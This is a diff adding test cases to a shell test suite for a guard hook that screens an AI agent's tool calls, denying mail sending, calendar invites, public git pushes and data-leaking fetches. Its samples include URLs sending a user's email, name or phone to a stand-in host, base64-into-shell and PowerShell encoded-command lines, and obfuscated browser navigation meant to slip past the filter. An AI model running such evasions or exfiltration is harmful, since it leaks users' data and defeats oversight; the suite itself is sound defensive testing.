@@ -140,6 +140,31 @@ check "codex node_repl mentioning linkedin (deny)" deny '{"tool_name":"mcp__node
 check "computer-use opening Mail app (deny)" deny '{"tool_name":"mcp__computer-use__open_application","tool_input":{"app":"Mail"}}'
 check "unrelated mcp tool (allow)" allow '{"tool_name":"mcp__interview-room__interview_say","tool_input":{"text":"hi"}}'
 check "unicode in input (allow)" allow '{"tool_name":"mcp__interview-room__interview_say","tool_input":{"text":"caf\u00e9 \u2014 ok \u00b7 \u00e9"}}'
+check "Calendly cancel_event (deny)" deny '{"tool_name":"mcp__claude_ai_Calendly__meetings-cancel_event","tool_input":{"uuid":"x"}}'
+check "Calendly create_invitee (deny)" deny '{"tool_name":"mcp__claude_ai_Calendly__meetings-create_invitee","tool_input":{"email":"x@y.com"}}'
+check "Calendly list_event_types (allow)" allow '{"tool_name":"mcp__claude_ai_Calendly__event_types-list_event_types","tool_input":{}}'
+check "Calendly load skill (allow)" allow '{"tool_name":"mcp__claude_ai_Calendly__load_calendly_skill","tool_input":{"name":"x"}}'
+check "Zoom meeting_create, nobody invited (allow)" allow '{"tool_name":"mcp__claude_ai_Zoom_for_Claude__meeting_create","tool_input":{"topic":"Practice"}}'
+check "Zoom meeting_create with meeting_invitees (deny)" deny '{"tool_name":"mcp__claude_ai_Zoom_for_Claude__meeting_create","tool_input":{"topic":"x","settings":{"meeting_invitees":[{"email":"x@y.com"}]}}}'
+check "Zoom meeting_update (deny)" deny '{"tool_name":"mcp__claude_ai_Zoom_for_Claude__meeting_update","tool_input":{}}'
+check "Zoom search_meetings (allow)" allow '{"tool_name":"mcp__claude_ai_Zoom_for_Claude__search_meetings","tool_input":{}}'
+check "calendar create with optional_attendees (deny)" deny '{"tool_name":"mcp__claude_ai_Google_Calendar__create_event","tool_input":{"summary":"x","optional_attendees":["a@b.com"]}}'
+check "calendar create with guest_emails (deny)" deny '{"tool_name":"mcp__gcal__create_event","tool_input":{"summary":"x","guest_emails":"a@b.com"}}'
+check "calendar create with participants (deny)" deny '{"tool_name":"mcp__cal__create_event","tool_input":{"participants":[{"email":"a@b.com"}]}}'
+check "calendar create, guestsCanInviteOthers false (allow)" allow '{"tool_name":"mcp__claude_ai_Google_Calendar__create_event","tool_input":{"summary":"x","guestsCanInviteOthers":false}}'
+check "mail tool without mail in name: messages_send (deny)" deny '{"tool_name":"mcp__nylas__messages_send","tool_input":{}}'
+check "graph sendMessage (deny)" deny '{"tool_name":"mcp__msgraph__sendMessage","tool_input":{}}'
+check "chat post_reply (deny)" deny '{"tool_name":"mcp__chat__post_reply","tool_input":{}}'
+check "drive trash_file (deny)" deny '{"tool_name":"mcp__claude_ai_Google_Drive__trash_file","tool_input":{}}'
+check "read tool with send in its name (allow)" allow '{"tool_name":"mcp__claude_ai_Superhuman_Mail__get_draft_send_status","tool_input":{}}'
+check "Chrome computer tool typing gmail address bar (deny)" deny '{"tool_name":"mcp__claude-in-chrome__computer","tool_input":{"action":"type","text":"mail.google.com"}}'
+check "Chrome javascript_tool atob to gmail (deny)" deny '{"tool_name":"mcp__claude-in-chrome__javascript_tool","tool_input":{"text":"window.location=atob(\"bWFpbC5nb29nbGUuY29t\")"}}'
+check "javascript fromCharCode navigation (deny)" deny '{"tool_name":"mcp__claude-in-chrome__javascript_tool","tool_input":{"text":"location.href=String.fromCharCode(104,116)"}}'
+check "browser to google redirect to gmail (deny)" deny '{"tool_name":"mcp__Claude_Browser__navigate","tool_input":{"url":"https://www.google.com/url?q=https%3A%2F%2Fmail%2Egoogle%2Ecom%2F"}}'
+check "browser to linkedin.cn (deny)" deny '{"tool_name":"mcp__claude-in-chrome__navigate","tool_input":{"url":"https://www.linkedin.cn/in/x"}}'
+check "browser to a short link (deny)" deny '{"tool_name":"mcp__claude-in-chrome__navigate","tool_input":{"url":"https://bit.ly/3abcde"}}'
+check "computer-use typing a gmail address into a form (allow)" allow '{"tool_name":"mcp__computer-use__type","tool_input":{"text":"jane.doe@gmail.com"}}'
+check "javascript filling a form with a gmail address (allow)" allow '{"tool_name":"mcp__claude-in-chrome__javascript_tool","tool_input":{"text":"document.querySelector(\"#email\").value=\"jane@gmail.com\""}}'
 
 echo "== guard ($IMPL): WebFetch"
 check "WebFetch normal job link (allow)" allow '{"tool_name":"WebFetch","tool_input":{"url":"https://jobs.example.com/job?id=12345&src=indeed","prompt":"x"}}'
@@ -160,6 +185,18 @@ check "WebFetch blob in path (deny)" deny "{\"tool_name\":\"WebFetch\",\"tool_in
 check "WebFetch medium-style /@user path (allow)" allow '{"tool_name":"WebFetch","tool_input":{"url":"https://medium.com/@someone/hiring-tips-123","prompt":"x"}}'
 check "WebFetch normal Workday job path (allow)" allow '{"tool_name":"WebFetch","tool_input":{"url":"https://acme.wd5.myworkdayjobs.com/en-US/Careers/job/Denver-CO/Engineer_R0012345?source=LinkedIn","prompt":"x"}}'
 check "WebFetch encoded spaces in path (allow)" allow '{"tool_name":"WebFetch","tool_input":{"url":"https://jobs.example.com/search/Process%20Engineer/Remote","prompt":"x"}}'
+check "WebFetch JSON-escaped @ (\\u0040) in query (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/c?e=jordan\u0040example.com","prompt":"x"}}'
+check "WebFetch JSON-escaped slashes (allow)" allow '{"tool_name":"WebFetch","tool_input":{"url":"https:\/\/jobs.example.com\/job?id=1","prompt":"x"}}'
+check "WebFetch non-ASCII escape in path (allow)" allow '{"tool_name":"WebFetch","tool_input":{"url":"https://jobs.example.com/caf\u00e9/ingenieur","prompt":"x"}}'
+check "WebFetch last name in path (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/u/testerson/x","prompt":"x"}}'
+check "WebFetch last name in host (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://testerson.evil.example/a","prompt":"x"}}'
+check "WebFetch last name in fragment (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/a#testerson","prompt":"x"}}'
+check "WebFetch last name inside a longer word in path (allow)" allow '{"tool_name":"WebFetch","tool_input":{"url":"https://jobs.example.com/testersonville-plant","prompt":"x"}}'
+check "WebFetch phone in host (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://2158675309.evil.example/","prompt":"x"}}'
+check "WebFetch email as (at) and (dot) (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/c/jordan(at)example(dot)com","prompt":"x"}}'
+long="$(head -c 2100 /dev/zero | tr '\0' 'a' | fold -w 50 | tr '\n' '/')"
+check "WebFetch address over 2000 characters (deny)" deny "{\"tool_name\":\"WebFetch\",\"tool_input\":{\"url\":\"https://evil.example/${long}\",\"prompt\":\"x\"}}"
+check "WebFetch very long host (deny)" deny "{\"tool_name\":\"WebFetch\",\"tool_input\":{\"url\":\"https://$(head -c 120 /dev/zero | tr '\0' 'b').evil.example/\",\"prompt\":\"x\"}}"
 
 echo "== guard ($IMPL): shell commands"
 check "Bash ls (allow)" allow "$(shelljson "$TN/pub" 'ls -la')"
@@ -207,6 +244,42 @@ check "PowerShell tool: gh repo create --public (deny)" deny "$(shelljson "$TN" 
 check "PowerShell tool: git $PU to private (allow)" allow "$(shelljson "$TN/priv" "git $PU origin main" PowerShell)"
 check "PowerShell tool: Get-ChildItem (allow)" allow "$(shelljson "$TN/pub" 'Get-ChildItem -Force' PowerShell)"
 check "Windows path C:\\\\Users with repo word (allow)" allow "{\"tool_name\":\"Bash\",\"cwd\":$(j "$TN/none"),\"tool_input\":{\"command\":\"ls C:\\\\Users\\\\repo\"}}"
+
+echo "== guard ($IMPL): shell commands, harder cases"
+mk aliased "$PUBURL"
+git -C "$T/aliased" config alias.ship "$PU"
+git -C "$T/aliased" config alias.shipall "!git $PU"
+git -C "$T/aliased" config alias.st status
+check "Codex cmd list, spaces around commas, public (deny)" deny "{\"tool_name\":\"shell\",\"cwd\":$(j "$TN/pub"),\"tool_input\":{\"cmd\":[ \"bash\" , \"-lc\" , \"git $PU\" ]}}"
+check "Codex cmd list, spaces around commas, ls (allow)" allow "{\"tool_name\":\"shell\",\"cwd\":$(j "$TN/pub"),\"tool_input\":{\"cmd\":[ \"bash\" , \"-lc\" , \"ls\" ]}}"
+check "gh repo create --public=true (deny)" deny "$(shelljson "$TN" 'gh repo create demo --public=true')"
+check "Codex list: gh repo create --public=true (deny)" deny "{\"tool_name\":\"exec_command\",\"cwd\":$(j "$TN"),\"tool_input\":{\"cmd\":[\"gh\",\"repo\",\"create\",\"demo\",\"--public=true\"]}}"
+check "PowerShell tool: GH.EXE repo create --public (deny)" deny "$(shelljson "$TN" 'GH.EXE repo create demo --public' PowerShell)"
+check "GIT.EXE $PU, public (deny)" deny "$(shelljson "$TN/pub" "GIT.EXE $PU origin main" PowerShell)"
+check "git -c remote.origin.url=<public> $PU (deny)" deny "$(shelljson "$TN/priv" "git -c remote.origin.url=$PUBURL $PU origin main")"
+check "git -c url...pushInsteadOf rewrite to public (deny)" deny "$(shelljson "$TN/priv" "git -c url.https://github.com/octocat/Hello-World.git.pushInsteadOf=$PRIVURL $PU origin main")"
+check "git -c alias.up=$PU up, public (deny)" deny "$(shelljson "$TN/pub" "git -c alias.up=$PU up origin main")"
+check "git alias from config for $PU, public (deny)" deny "$(shelljson "$TN/aliased" 'git ship origin main')"
+check "git shell alias running $PU, public (deny)" deny "$(shelljson "$TN/aliased" 'git shipall')"
+check "git alias for status (allow)" allow "$(shelljson "$TN/aliased" 'git st')"
+check "git log (allow)" allow "$(shelljson "$TN/pub" 'git log --oneline -5')"
+check "git subtree $PU, public (deny)" deny "$(shelljson "$TN/pub" "git subtree $PU --prefix=dist origin main")"
+check "git send-pack <public URL> (deny)" deny "$(shelljson "$TN/none" "git send-pack $PUBURL main")"
+check "git $PU \$REMOTE variable (deny unread)" deny "$(shelljson "$TN/pub" "git $PU \$REMOTE main")"
+check "git $PU to GitHub.com upper case, public (deny)" deny "$(shelljson "$TN/none" "git $PU https://GitHub.com/octocat/Hello-World.git main")"
+check "gh gist create --public (deny)" deny "$(shelljson "$TN" 'gh gist create notes.md --public')"
+check "gh gist create -p (deny)" deny "$(shelljson "$TN" 'gh gist create -p notes.md')"
+check "gh gist create, secret (allow)" allow "$(shelljson "$TN/none" 'gh gist create notes.md')"
+check "gh api PATCH private=false (deny)" deny "$(shelljson "$TN" 'gh api -X PATCH repos/me/jobs -F private=false')"
+check "gh api PATCH visibility=public (deny)" deny "$(shelljson "$TN" 'gh api --method PATCH repos/me/jobs -f visibility=public')"
+check "gh api with --input to a repos endpoint (deny unread)" deny "$(shelljson "$TN" 'gh api -X POST user/repos --input body.json')"
+check "gh api read (allow)" allow "$(shelljson "$TN/none" 'gh api repos/me/jobs')"
+check "base64 decoded into sh (deny hidden)" deny "$(shelljson "$TN/pub" 'echo Z2l0IHB1c2g= | base64 -d | sh')"
+check "eval with base64 (deny hidden)" deny "$(shelljson "$TN/pub" 'eval "$(echo Z2l0IHB1c2g= | base64 --decode)"')"
+check "PowerShell -EncodedCommand (deny hidden)" deny "$(shelljson "$TN/pub" 'powershell -EncodedCommand ZwBpAHQA' PowerShell)"
+check "PowerShell FromBase64String + iex (deny hidden)" deny "$(shelljson "$TN/pub" 'iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($x)))' PowerShell)"
+check "PowerShell Get-Content -Encoding UTF8 (allow)" allow "$(shelljson "$TN/pub" 'Get-Content -Encoding UTF8 jobs/tracker.csv' PowerShell)"
+check "base64 encode a file, no shell (allow)" allow "$(shelljson "$TN/pub" 'base64 -i photo.png -o photo.txt')"
 
 echo "== guard ($IMPL): input shape"
 check "empty stdin (deny)" deny ''
